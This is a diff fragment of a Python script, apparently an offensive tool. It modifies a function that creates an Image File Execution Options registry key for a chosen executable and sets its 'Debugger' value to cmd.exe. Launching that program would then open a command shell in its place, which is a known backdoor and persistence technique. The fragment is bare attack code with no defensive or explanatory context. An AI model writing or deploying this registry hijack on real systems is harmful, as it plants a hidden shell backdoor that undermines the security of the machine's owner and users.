@@ -7,12 +7,18 @@ to specifiy an executable that should be run instead of the specified applicatio
 import os
 import _winreg
 
-def image_file_execution(executable,executable_path):
-	registry_path = r"Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
-		
+def cmd_path():
+	path = "c:/windows/system32/cmd.exe"
+	
+	if (os.path.isfile(os.path.join(path)) == True):
+		return os.path.join(path)
+	else:
+		return False
+
+def image_file_execution(executable):
 	try:
-		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,os.path.join(registry_path,executable))
-		_winreg.SetValueEx(key,"Debugger",0,_winreg.REG_SZ,executable_path)
+		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,os.path.join("Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options",executable))
+		_winreg.SetValueEx(key,"Debugger",0,_winreg.REG_SZ,cmd_path())
 	except Exception as e:
 		return False
 	except WindowsError as e:
